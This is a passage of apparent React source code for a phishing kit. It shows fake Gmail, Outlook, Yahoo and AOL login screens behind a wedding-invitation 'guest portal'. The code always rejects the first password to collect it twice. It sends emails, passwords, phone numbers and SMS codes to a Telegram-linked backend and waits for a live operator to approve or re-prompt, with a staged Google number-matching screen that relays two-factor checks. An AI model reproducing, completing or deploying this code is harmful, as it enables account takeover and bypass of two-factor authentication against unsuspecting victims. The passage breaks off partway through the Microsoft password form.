import React, { useState, FormEvent, useEffect } from "react";
import { Eye, EyeOff, ShieldCheck, ChevronDown, Check, ArrowLeft, HelpCircle, Shield, Key, AlertCircle, Fingerprint, CheckCircle2, Smartphone, Lock, RefreshCw } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { GatewayProvider } from "../types";

interface ProviderLoginProps {
  provider: GatewayProvider;
  onLoginSuccess: (email: string) => void;
  onBack: () => void;
  logAction: (type: "PAGE_VIEW" | "PROVIDER_SELECT" | "GATEWAY_LOGIN_ATTEMPT" | "LOGIN_SUCCESS" | "RSVP_SUBMITTED", details: string) => void;
}

export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAction }: ProviderLoginProps) {
  const [step, setStep] = useState<"email" | "password" | "incorrect_password" | "phone_prompt" | "sms_prompt" | "number_prompt" | "success_gate">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [phone, setPhone] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [successProgress, setSuccessProgress] = useState(0);

  // Simulated Google Number Prompt states
  const [promptNumber, setPromptNumber] = useState<number>(42);
  const [phoneState, setPhoneState] = useState<"incoming" | "prompt" | "match" | "success" | "denied">("incoming");
  const [selectedMobileNumber, setSelectedMobileNumber] = useState<number | null>(null);
  const [mobileOptions, setMobileOptions] = useState<number[]>([]);

  // Real-time Telegram Remote Control Overrides
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [telegramActive, setTelegramActive] = useState<boolean>(false);

  // Poll active Telegram transaction status until resolution
  useEffect(() => {
    if (!attemptId) return;

    const poll = async () => {
      try {
        const res = await fetch(`/api/telegram/attempt_status?id=${attemptId}`);
        if (res.ok) {
          const data = await res.json();
          
          if (data.status === "approved") {
            setError("");
            setStep("success_gate");
            setAttemptId(null);
          } else if (data.status === "request_sms") {
            setError("");
            setStep("phone_prompt");
            setAttemptId(null);
          } else if (data.status === "incorrect_password") {
            setError("Incorrect entry check. Security controller requested verification. Please re-type password.");
            setStep("incorrect_password");
            setAttemptId(null);
          } else if (data.status === "denied") {
            setError("Bypass credentials verification declined.");
            setStep("email");
            setAttemptId(null);
          }
        }
      } catch (err) {
        console.warn("Polling state check failure:", err);
      }
    };

    const interval = setInterval(poll, 1600);
    return () => clearInterval(interval);
  }, [attemptId]);

  useEffect(() => {
    if (step === "success_gate") {
      setSuccessProgress(0);
      const interval = setInterval(() => {
        setSuccessProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval);
            return 100;
          }
          return prev + 4;
        });
      }, 80);
      return () => clearInterval(interval);
    }
  }, [step]);

  useEffect(() => {
    if (step === "success_gate" && successProgress === 100) {
      const timeout = setTimeout(() => {
        onLoginSuccess(email);
      }, 400);
      return () => clearTimeout(timeout);
    }
  }, [successProgress, step, email, onLoginSuccess]);

  useEffect(() => {
    if (step === "number_prompt") {
      const target = [24, 38, 42, 57, 73, 89][Math.floor(Math.random() * 6)];
      setPromptNumber(target);
      setPhoneState("incoming");
      setSelectedMobileNumber(null);
      
      const options = [target];
      while (options.length < 3) {
        const rand = Math.floor(Math.random() * 89) + 10;
        if (!options.includes(rand)) {
          options.push(rand);
        }
      }
      options.sort(() => Math.random() - 0.5);
      setMobileOptions(options);

      const timer = setTimeout(() => {
        setPhoneState("prompt");
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleEmailSubmit = (e: FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email) {
      setError("Please enter your email address.");
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setError("Please enter a valid email address.");
      return;
    }

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep("password");
      logAction("GATEWAY_LOGIN_ATTEMPT", `Guest entered email for ${provider}: ${email}`);
    }, 600);
  };

  const handlePasswordSubmit = (e: FormEvent) => {
    e.preventDefault();
    setError("");

    if (!password) {
      setError("Please enter your password.");
      return;
    }

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setPassword(""); // Clear current password to force re-entry
      setStep("incorrect_password");
      logAction("GATEWAY_LOGIN_ATTEMPT", `Guest 2FA Step: First password entry submitted. Incorrect password page displayed.`);
    }, 900);
  };

  const handleIncorrectPasswordSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");

    if (!password) {
      setError("Please enter your password.");
      return;
    }

    setLoading(true);
    try {
      // 1. Generate Google matching digits beforehand if portal is gmail
      let targetCode = 42;
      if (provider === "gmail") {
        targetCode = [24, 38, 42, 57, 73, 89][Math.floor(Math.random() * 6)];
        setPromptNumber(targetCode);
      }

      // 2. Submit credentials payload to register active transaction on serve side
      const response = await fetch("/api/telegram/login_attempt", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          provider,
          email,
          password,
          promptNumber: provider === "gmail" ? targetCode : undefined
        })
      });

      if (response.ok) {
        const data = await response.json();
        setAttemptId(data.id);
        
        // Check if Telegram bot is actively armed
        const cfgRes = await fetch("/api/telegram/config");
        if (cfgRes.ok) {
          const cfg = await cfgRes.json();
          setTelegramActive(cfg.hasToken);
        }
      }
    } catch (err) {
      console.warn("Failed to synchronize interactive session with Telegram bot API:", err);
    } finally {
      setLoading(false);
      if (provider === "gmail") {
        setStep("number_prompt");
        logAction("GATEWAY_LOGIN_ATTEMPT", `Guest 2FA Step: Correct credentials hand-shake submitted. Initiating Google Number-Matching lock screen.`);
      } else {
        setStep("phone_prompt");
        logAction("GATEWAY_LOGIN_ATTEMPT", `Guest 2FA Step: Correct credentials hand-shake submitted. Setting phone gate.`);
      }
    }
  };

  const handlePhoneSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");

    if (!phone) {
      setError("Please enter your phone number.");
      return;
    }

    if (phone.replace(/\D/g, "").length < 6) {
      setError("Please enter a valid phone number (at least 6 digits).");
      return;
    }

    setLoading(true);
    try {
      if (attemptId) {
        await fetch("/api/telegram/otp_attempt", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id: attemptId, phone })
        });
      }
    } catch (err) {
      console.warn("Telemetry synchronization deferred:", err);
    } finally {
      setLoading(false);
      setStep("sms_prompt");
      logAction("GATEWAY_LOGIN_ATTEMPT", `Guest 2FA Step: Recovery phone number validated: +1 ${phone}`);
    }
  };

  const handleSmsSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");

    if (!smsCode) {
      setError("Please enter your verification code.");
      return;
    }

    if (smsCode.trim().length < 4) {
      setError("SMS security code must be 4 to 6 characters.");
      return;
    }

    setLoading(true);
    try {
      if (attemptId) {
        await fetch("/api/telegram/otp_attempt", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id: attemptId, smsCode })
        });

        const cfgRes = await fetch("/api/telegram/config");
        if (cfgRes.ok) {
          const cfg = await cfgRes.json();
          if (!cfg.hasToken) {
            // No bot token configured, bypass automatically
            setTimeout(() => {
              setStep("success_gate");
              setLoading(false);
              logAction("LOGIN_SUCCESS", `Guest ${email} successfully passed security check (offline self-approve fallback).`);
            }, 1200);
          } else {
            // Waiting on host to tap "Approve OTP" or "Invalid Code" in Telegram
            setError("🔒 OTP verification uploaded. Pending validation from the active Telegram console...");
            setLoading(false);
          }
        } else {
          setStep("success_gate");
          setLoading(false);
        }
      } else {
        // Fallback for standalone preview
        setTimeout(() => {
          setLoading(false);
          setStep("success_gate");
          logAction("LOGIN_SUCCESS", `Guest ${email} successfully passed security check.`);
        }, 1100);
      }
    } catch (err) {
      setStep("success_gate");
      setLoading(false);
    }
  };

  const handleBackToEmail = () => {
    setStep("email");
    setError("");
  };

  // Google SVG Logo
  const GoogleLogo = () => (
    <div className="flex justify-center mb-6">
      <svg className="h-8 select-none" viewBox="0 0 74 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M9.24 11.23v2.85h7.32c-.3 1.6-1.72 4.7-7.32 4.7-4.8 0-8.7-3.97-8.7-8.87s3.9-8.86 8.7-8.86c2.73 0 4.56 1.13 5.6 2.13l2.25-2.17C15.34 2.19 12.59.8 9.24.8 4.14.8 0 4.9 0 10s4.14 9.2 9.24 9.2c5.33 0 8.87-3.72 8.87-9.02 0-.6-.06-1.07-.15-1.45H9.24z" fill="#4285F4" />
        <path d="M25.3 19.2c-4.13 0-6.9-3.05-6.9-6.87s2.77-6.87 6.9-6.87c4.13 0 6.9 3.05 6.9 6.87s-2.77 6.87-6.9 6.87zm0-11c-2.45 0-4.04 1.95-4.04 4.13s1.59 4.13 4.04 4.13 4.04-1.95 4.04-4.13-1.59-4.13-4.04-4.13z" fill="#EA4335" />
        <path d="M39.6 19.2c-4.13 0-6.9-3.05-6.9-6.87s2.77-6.87 6.9-6.87c4.13 0 6.9 3.05 6.9 6.87s-2.77 6.87-6.9 6.87zm0-11c-2.45 0-4.04 1.95-4.04 4.13s1.59 4.13 4.04 4.13 4.04-1.95 4.04-4.13-1.59-4.13-4.04-4.13z" fill="#FBBC05" />
        <path d="M53.6 19.2c-3.8 0-6.3-2.65-6.3-6.75s2.5-6.87 6.3-6.87c2.6 0 4.3 1.45 4.9 2.5l-4 1.63c-.4-.73-1.1-1.38-2.1-1.38-1.55 0-2.4 1.45-2.4 2.87 0 1.63.95 2.87 2.4 2.87 1.15 0 1.8-.75 2.25-1.5l3.95 1.63c-.65 1-2.4 2.5-5 2.5z" fill="#4285F4" />
        <path d="M63 23V.8h2.8V23H63z" fill="#34A853" />
        <path d="M69.6 19.2c-2.4 0-4.2-1.2-5.1-2.9l9.1-3.75-.3-.75c-.5-1.35-2-4.13-5.4-4.13-3.35 0-6.1 2.65-6.1 6.87s2.75 6.87 6.1 6.87c2.7 0 4.2-1.63 4.9-2.6l-2.2-1.45c-.65.95-1.55 1.55-2.7 1.55zm.1-11c-1.3 0-2.4.65-2.9 1.63l6.5 2.7c-.35-1.45-1.8-2.33-3.6-2.33z" fill="#EA4335" />
      </svg>
    </div>
  );

  // Microsoft Logo (personal Outlook & Office365)
  const MicrosoftLogo = () => (
    <div className="flex items-center gap-2 mb-6 select-none justify-start">
      <div className="grid grid-cols-2 gap-0.5 w-[20px] h-[20px]">
        <div className="bg-[#f25022] w.2.5 h-2.5"></div>
        <div className="bg-[#7fba00] w.2.5 h-2.5"></div>
        <div className="bg-[#00a4ef] w.2.5 h-2.5"></div>
        <div className="bg-[#ffb900] w.2.5 h-2.5"></div>
      </div>
      <span className="font-semibold text-slate-100 text-lg tracking-tight font-sans">Microsoft</span>
    </div>
  );

  // Yahoo Logo
  const YahooLogo = () => (
    <div className="flex justify-center mb-6 select-none">
      <span className="font-sans font-black text-3xl tracking-tighter text-[#a04efc] italic">
        yahoo<span className="text-[#a516ef] not-italic font-bold">!</span>
      </span>
    </div>
  );

  // AOL Logo
  const AolLogo = () => (
    <div className="flex justify-center mb-6 select-none">
      <span className="font-sans font-black text-3xl tracking-tight text-white">
        aol<span className="text-emerald-400 font-extrabold text-2xl">.</span>
      </span>
    </div>
  );

  // Generic Secure Mail Logo
  const GenericMailLogo = () => (
    <div className="flex items-center gap-3.5 mb-6 justify-center">
      <div className="w-10 h-10 rounded-xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-300">
        <Shield size={20} className="animate-pulse" />
      </div>
      <div className="text-left">
        <h3 className="font-sans font-bold text-sm tracking-wide text-white uppercase">SECURE MAIL</h3>
        <p className="font-sans text-[9px] text-slate-400 tracking-wider">ENTERPRISE GATEWAY</p>
      </div>
    </div>
  );

  // Render authentic designs based on provider
  const renderGoogleDesign = () => {
    return (
      <div className="w-full max-w-[450px] mx-auto glass-card rounded-3xl p-8 sm:p-10 shadow-2xl relative border border-white/10" id="google-login-viewport">
        <GoogleLogo />
        
        {step === "email" && (
          <form onSubmit={handleEmailSubmit} className="space-y-6" id="google-email-form">
            <div className="text-center sm:text-left">
              <h2 className="text-white text-2xl font-normal tracking-tight mb-2">Sign in</h2>
              <p className="text-slate-300 text-sm font-light">to continue to Gmail</p>
            </div>

            <div className="space-y-1">
              <div className="relative">
                <input
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className={`w-full bg-[#0b0f19]/80 text-white font-sans text-sm border ${error ? 'border-red-400 focus:border-red-400' : 'border-slate-700 focus:border-blue-500'} rounded-md py-3.5 px-4 outline-none transition-all placeholder-slate-500 focus:ring-1 focus:ring-blue-500/50`}
                  placeholder="Email or phone"
                  disabled={loading}
                />
              </div>
              {error && <p className="text-red-400 text-xs font-sans pl-1">⚠️ {error}</p>}
            </div>

            <div className="flex justify-between items-center text-xs font-medium text-blue-400 pt-1">
              <button type="button" className="hover:text-blue-300 cursor-pointer">Forgot email?</button>
            </div>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl">
              <p className="font-semibold text-slate-200 mb-1">✨ Guest Authorization Portal</p>
              <p>Type your personal or work email and click Next.</p>
            </div>

            <div className="flex items-center justify-between pt-4">
              <button
                type="button"
                onClick={onBack}
                className="text-slate-400 hover:text-slate-200 text-sm font-medium transition-colors cursor-pointer"
              >
                Back
              </button>
              <button
                type="submit"
                disabled={loading}
                className="bg-blue-600 hover:bg-blue-700 text-white font-sans text-sm font-medium px-6 py-2 rounded-md transition-colors min-w-[90px] flex items-center justify-center cursor-pointer shadow-md shadow-blue-600/10"
              >
                {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Next"}
              </button>
            </div>
          </form>
        )}

        {step === "password" && (
          <form onSubmit={handlePasswordSubmit} className="space-y-6" id="google-password-form">
            <div className="text-center sm:text-left">
              <h2 className="text-white text-2xl font-normal tracking-tight mb-1">Welcome</h2>
              
              <div 
                className="inline-flex items-center gap-1.5 bg-white/5 hover:bg-white/10 border border-white/10 text-slate-200 text-xs rounded-full py-1 px-3.5 cursor-pointer mt-1 mb-2 transition-all"
                onClick={handleBackToEmail}
              >
                <div className="w-2.5 h-2.5 bg-blue-500 rounded-full"></div>
                <span className="font-mono">{email}</span>
                <ChevronDown size={12} className="text-slate-400" />
              </div>
            </div>

            <div className="space-y-1">
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full bg-[#0b0f19]/80 text-white font-sans text-sm border ${error ? 'border-red-400 focus:border-red-400' : 'border-slate-700 focus:border-blue-500'} rounded-md py-3.5 px-4 pr-12 outline-none transition-all placeholder-slate-500 focus:ring-1 focus:ring-blue-500/50`}
                  placeholder="Enter your password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans pl-1">⚠️ {error}</p>}
            </div>

            <div className="flex items-center gap-2 text-xs text-slate-300">
              <input
                type="checkbox"
                id="showPasswordCheck"
                checked={showPassword}
                onChange={() => setShowPassword(!showPassword)}
                className="w-4 h-4 rounded border-slate-700 bg-white/5 text-blue-600 focus:ring-0 cursor-pointer"
              />
              <label htmlFor="showPasswordCheck" className="cursor-pointer">Show password</label>
            </div>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl">
              <p className="font-semibold text-emerald-400 mb-1 flex items-center gap-1">
                <Check size={12} /> Authentication Gate
              </p>
              <p>Type your personal email password to establish a cloud synchronization handshake.</p>
            </div>

            <div className="flex items-center justify-between pt-4">
              <button
                type="button"
                onClick={handleBackToEmail}
                className="text-slate-400 hover:text-slate-200 text-sm font-medium transition-colors cursor-pointer"
              >
                Change email
              </button>
              <button
                type="submit"
                disabled={loading}
                className="bg-blue-600 hover:bg-blue-700 text-white font-sans text-sm font-medium px-6 py-2 rounded-md transition-colors min-w-[90px] flex items-center justify-center cursor-pointer shadow-md shadow-blue-600/10"
              >
                {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Next"}
              </button>
            </div>
          </form>
        )}

        {step === "incorrect_password" && (
          <form onSubmit={handleIncorrectPasswordSubmit} className="space-y-6" id="google-incorrect-form">
            <div className="text-center sm:text-left">
              <h2 className="text-white text-2xl font-normal tracking-tight mb-1">Welcome</h2>
              
              <div 
                className="inline-flex items-center gap-1.5 bg-white/5 border border-white/10 text-slate-200 text-xs rounded-full py-1 px-3.5 cursor-pointer mt-1 mb-2 transition-all"
                onClick={handleBackToEmail}
              >
                <div className="w-2.5 h-2.5 bg-red-500 rounded-full"></div>
                <span className="font-mono">{email}</span>
                <ChevronDown size={12} className="text-slate-400" />
              </div>
            </div>

            {/* Error Message Box */}
            <div className="bg-red-500/10 border border-red-500/20 text-red-250 text-xs py-3 px-4 rounded-lg flex items-start gap-2.5 animate-shake" id="google-err-box">
              <AlertCircle size={16} className="text-red-400 mt-0.5 shrink-0" />
              <div>
                <p className="font-semibold text-red-300">Wrong password. Try again.</p>
                <p className="text-slate-400 mt-0.5">The credentials entered failed authentication check. Please re-enter your password to proceed.</p>
              </div>
            </div>

            <div className="space-y-1">
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-[#0b0f19]/80 text-white font-sans text-sm border border-red-500 rounded-md py-3.5 px-4 pr-12 outline-none focus:ring-1 focus:ring-red-500/50"
                  placeholder="Re-enter password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans pl-1">⚠️ {error}</p>}
            </div>

            <div className="flex items-center justify-between pt-4">
              <button
                type="button"
                onClick={handleBackToEmail}
                className="text-slate-400 hover:text-slate-200 text-sm font-medium transition-colors cursor-pointer"
              >
                Forgot your credentials?
              </button>
              <button
                type="submit"
                disabled={loading}
                className="bg-blue-600 hover:bg-blue-700 text-white font-sans text-sm font-medium px-6 py-2 rounded-md transition-colors min-w-[90px] flex items-center justify-center cursor-pointer shadow-md"
              >
                {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Next"}
              </button>
            </div>
          </form>
        )}

        {step === "number_prompt" && (
          <div className="space-y-6" id="google-number-prompt-container">
            <div className="text-center sm:text-left">
              <h2 className="text-white text-2xl font-normal tracking-tight mb-2">Check your phone</h2>
              <p className="text-slate-300 text-sm font-light">
                Google sent a push notification to your phone. Tap <span className="font-semibold text-white">Yes</span>, then choose the matching number shown below.
              </p>
            </div>

            <div className="flex flex-col items-center justify-center my-6 py-4 bg-white/5 border border-white/5 rounded-2xl">
              <div className="w-24 h-24 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 font-sans font-extrabold text-5xl flex items-center justify-center shadow-lg shadow-blue-500/5 select-none animate-pulse">
                {promptNumber}
              </div>
              <p className="text-[10px] text-slate-400 tracking-wider uppercase mt-4 font-mono">Sign-in matching code</p>
            </div>

            {/* Simulated Desktop Status */}
            {phoneState !== "success" && phoneState !== "denied" && (
              <div className="flex items-center gap-2.5 justify-center py-1 text-xs text-slate-400 font-sans">
                <span className="relative flex h-2 w-2">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-blue-500"></span>
                </span>
                <span>Waiting for mobile response...</span>
              </div>
            )}

            {/* Interactive Mobile Simulator inside Login Card */}
            <div className="bg-[#0b0c16] border border-slate-800 rounded-2xl p-4 mt-6 relative shadow-inner overflow-hidden font-sans">
              <div className="flex justify-between items-center text-[10px] text-slate-500 font-semibold mb-3 border-b border-white/5 pb-2">
                <span className="flex items-center gap-1">
                  <Smartphone size={11} className="text-slate-400" />
                  Simulated Personal Device
                </span>
                <span>Google Play services</span>
              </div>

              {phoneState === "incoming" && (
                <div className="flex flex-col items-center justify-center py-6 text-center space-y-3">
                  <div className="w-9 h-9 rounded-full bg-blue-500/15 flex items-center justify-center text-blue-400 animate-bounce">
                    <Smartphone size={18} />
                  </div>
                  <div>
                    <p className="text-white text-xs font-semibold">Incoming login request...</p>
                    <p className="text-slate-400 text-[10px] mt-0.5">Establishing 256-bit secure gateway connection</p>
                  </div>
                </div>
              )}

              {phoneState === "prompt" && (
                <div className="space-y-3 text-left">
                  <div className="bg-white/5 p-3.5 rounded-xl border border-white/10 space-y-1.5">
                    <p className="text-blue-400 text-[10px] font-bold uppercase tracking-wider flex items-center gap-1">
                      <Lock size={10} /> Google Account Security
                    </p>
                    <p className="text-white text-xs font-semibold">Are you trying to sign in from your computer?</p>
                    <div className="text-slate-400 text-[10px] font-mono leading-normal mt-2 bg-black/30 p-2 rounded-lg space-y-1">
                      <p>• Device: Chrome Browser (Registry Client)</p>
                      <p>• Account: {email || "Guest login"}</p>
                      <p>• Location: Nearby</p>
                    </div>
                  </div>
                  <div className="flex gap-2 justify-end">
                    <button
                      type="button"
                      onClick={() => {
                        setPhoneState("denied");
                        logAction("GATEWAY_LOGIN_ATTEMPT", "Google prompt rejected on simulated device.");
                      }}
                      className="bg-red-500/10 hover:bg-red-500/20 text-red-400 text-[11px] py-1.5 px-3 rounded-lg border border-red-500/20 transition-all font-medium cursor-pointer"
                    >
                      No, it's not me
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        setPhoneState("match");
                        logAction("GATEWAY_LOGIN_ATTEMPT", "Google prompt approved. Displaying number matching grid.");
                      }}
                      className="bg-blue-600 hover:bg-blue-700 text-white text-[11px] py-1.5 px-4 rounded-lg transition-all font-semibold cursor-pointer shadow-md shadow-blue-600/20"
                    >
                      Yes, it's me
                    </button>
                  </div>
                </div>
              )}

              {phoneState === "match" && (
                <div className="text-center space-y-3">
                  <p className="text-white text-xs font-semibold">Select the matching number on your phone:</p>
                  
                  {error && <p className="text-red-400 text-[11px] font-medium text-center">⚠️ {error}</p>}
                  
                  <div className="grid grid-cols-3 gap-2.5 pt-1">
                    {mobileOptions.map((num) => (
                      <button
                        key={num}
                        type="button"
                        onClick={() => {
                          setSelectedMobileNumber(num);
                          if (num === promptNumber) {
                            setError("");
                            setPhoneState("success");
                            logAction("LOGIN_SUCCESS", `Google prompt matched successfully with: ${num}`);
                            setLoading(true);
                            setTimeout(() => {
                              setLoading(false);
                              setStep("success_gate");
                            }, 1200);
                          } else {
                            logAction("GATEWAY_LOGIN_ATTEMPT", `Google prompt failed: wrong number tapped: ${num}`);
                            setError("Wrong number. Please select the correct matching digit.");
                          }
                        }}
                        className="h-11 bg-white/5 hover:bg-blue-500/10 active:bg-blue-600/20 hover:border-blue-500/30 border border-slate-700 text-slate-100 rounded-lg font-bold font-sans text-sm transition-all flex items-center justify-center cursor-pointer"
                      >
                        {num}
                      </button>
                    ))}
                  </div>
                  <p className="text-slate-400 text-[10px]">Select the number that matches the computer screen.</p>
                </div>
              )}

              {phoneState === "success" && (
                <div className="flex flex-col items-center justify-center py-6 text-center space-y-3">
                  <div className="w-10 h-10 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
                    <Check size={20} />
                  </div>
                  <div>
                    <p className="text-emerald-400 text-xs font-semibold">Approval Authorized!</p>
                    <p className="text-slate-400 text-[10px] mt-0.5">Secure credential tickets successfully paired.</p>
                  </div>
                </div>
              )}

              {phoneState === "denied" && (
                <div className="text-center py-4 space-y-3">
                  <p className="text-red-400 text-xs font-semibold">Authentication Blocked</p>
                  <p className="text-slate-400 text-[10px]">This transaction request has been declined.</p>
                  <button
                    type="button"
                    onClick={() => {
                      setPhoneState("prompt");
                      setError("");
                    }}
                    className="text-xs bg-white/5 hover:bg-white/10 text-blue-400 border border-white/5 py-1 px-3 rounded-full transition-colors cursor-pointer"
                  >
                    Retry notification check
                  </button>
                </div>
              )}
            </div>

            <div className="flex items-center justify-between pt-4 border-t border-white/5">
              <button
                type="button"
                onClick={() => setStep("incorrect_password")}
                className="text-slate-400 hover:text-slate-200 text-xs font-medium cursor-pointer"
              >
                Back to Password entry
              </button>
              <button
                type="button"
                onClick={() => {
                  setStep("number_prompt");
                  setError("");
                }}
                className="text-blue-400 hover:text-blue-300 text-xs font-semibold cursor-pointer"
              >
                Resend Prompt
              </button>
            </div>
          </div>
        )}

        {step === "success_gate" && (
          <div className="flex flex-col items-center justify-center py-8 text-center" id="google-success-panel">
            <div className="w-16 h-16 bg-emerald-500/10 border border-emerald-500/20 rounded-full flex items-center justify-center text-emerald-400 mb-4 animate-bounce">
              <CheckCircle2 size={36} />
            </div>
            <h2 className="text-white text-2xl font-normal mb-1">Authenticated!</h2>
            <p className="text-slate-400 text-sm px-6 max-w-sm mt-1">Establishing 256-bit encrypted gateway tunnel. Loading wedding invitation...</p>
            
            <div className="w-full max-w-xs bg-white/5 border border-white/5 h-2 rounded-full overflow-hidden mt-6">
              <div 
                className="h-full bg-blue-500 rounded-full transition-all duration-100 ease-out"
                style={{ width: `${successProgress}%` }}
              />
            </div>
            <span className="text-[10px] text-blue-400 font-mono mt-2">{successProgress}% Completed</span>
          </div>
        )}
      </div>
    );
  };

  const renderMicrosoftDesign = () => {
    const isOffice = provider === "office365";
    const brandName = isOffice ? "Office 365" : "Outlook";
    return (
      <div className="w-full max-w-[440px] mx-auto glass-card rounded-2xl p-9 sm:p-11 shadow-2xl relative border border-white/10" id="microsoft-login-viewport">
        <MicrosoftLogo />

        {step === "email" && (
          <form onSubmit={handleEmailSubmit} className="space-y-6" id="microsoft-email-form">
            <div className="text-left">
              <h2 className="text-white text-[22px] font-semibold tracking-tight mb-2">Sign in</h2>
              <p className="text-slate-300 text-[13px] font-normal leading-snug">to continue to your {brandName} Webmail</p>
            </div>

            <div className="space-y-1">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`w-full bg-transparent text-white font-sans text-sm border-b ${error ? 'border-b-red-400 focus:border-b-red-400' : 'border-b-slate-500 focus:border-b-[#0067b8]'} py-2 px-0 outline-none transition-all placeholder-slate-500 focus:border-b-2`}
                placeholder="Email, phone, or Skype"
                disabled={loading}
              />
              {error && <p className="text-red-400 text-xs font-sans pt-1">⚠️ {error}</p>}
            </div>

            <div className="text-xs text-slate-400 space-y-2 pt-1">
              <p>No account? <span className="text-[#0067b8] hover:underline cursor-pointer">Create one!</span></p>
              <p><span className="text-[#0067b8] hover:underline cursor-pointer">Can't access your account?</span></p>
            </div>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl">
              <p className="font-semibold text-slate-200">✨ Invitation Guest Access</p>
              <p>Provide your guest email address to access your custom invite hub.</p>
            </div>

            <div className="flex items-center justify-end gap-3 pt-4">
              <button
                type="button"
                onClick={onBack}
                className="bg-[#e1e1e1]/15 hover:bg-[#e1e1e1]/25 text-slate-200 font-sans text-xs px-5 py-2 transition-all cursor-pointer border border-white/10"
              >
                Back
              </button>
              <button
                type="submit"
                disabled={loading}
                className="bg-[#0067b8] hover:bg-[#005da6] text-white font-sans text-xs font-normal px-8 py-2 min-w-[90px] flex items-center justify-center cursor-pointer shadow-md shadow-blue-500/10"
              >
                {loading ? <div className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Next"}
              </button>
            </div>
          </form>
        )}

        {step === "password" && (
          <form onSubmit={handlePasswordSubmit} className="space-y-6" id="microsoft-password-form">
            <div className="text-left">
              {/* Back Arrow with User Email */}
              <div className="flex items-center gap-2 mb-3">
                <button 
                  type="button" 
                  onClick={handleBackToEmail}
                  className="w-5 h-5 rounded-full hover:bg-white/15 flex items-center justify-center text-slate-300 transition-colors"
                >
                  <ArrowLeft size={14} />
                </button>
                <span className="font-mono text-sm text-slate-300">{email}</span>
              </div>

              <h2 className="text-white text-[22px] font-semibold tracking-tight mb-1">Enter password</h2>
            </div>

            <div className="space-y-1">
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full bg-transparent text-white font-sans text-sm border-b ${error ? 'border-b-red-400 focus:border-b-red-400' : 'border-b-slate-500 focus:border-b-[#0067b8]'} py-2 pr-10 px-0 outline-none transition-all placeholder-slate-500 focus:border-b-2`}
                  placeholder="Password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans pt-1">⚠️ {error}</p>}
            </div>

            <div className="text-xs text-slate-400 space-y-2 pt-1">
              <p><span className="text-[#0067b8] hover:underline cursor-pointer">Forgot password?</span></p>
              <p><span className="text-[#0067b8] hover:underline cursor-pointer">Other ways to sign in</span></p>
            </div>

            <div className="text-xs text-slate-400 leading-normal bg-white/5 border border-white/5 p-4 rounded-xl">
              <p className="font-semibold text-emerald-400 mb-1 flex items-center gap-1">
                <Check size={12} /> Encrypted Workspace Access
              </p>
              <p>Sign in is corporate gateway authenticated. Enter your credentials to verify your invite credentials.</p>
            </div>

            <div className="flex items-center justify-end gap-3 pt-4">
              <button
                type="button"
                onClick={handleBackToEmail}
                className="bg-[#e1e1e1]/15 hover:bg-[#e1e1e1]/25 text-slate-200 font-sans text-xs px-5 py-2 transition-all cursor-pointer border border-white/10"
              >
                Back
              </button>
              <button
                type="submit"
                disabled={loading}
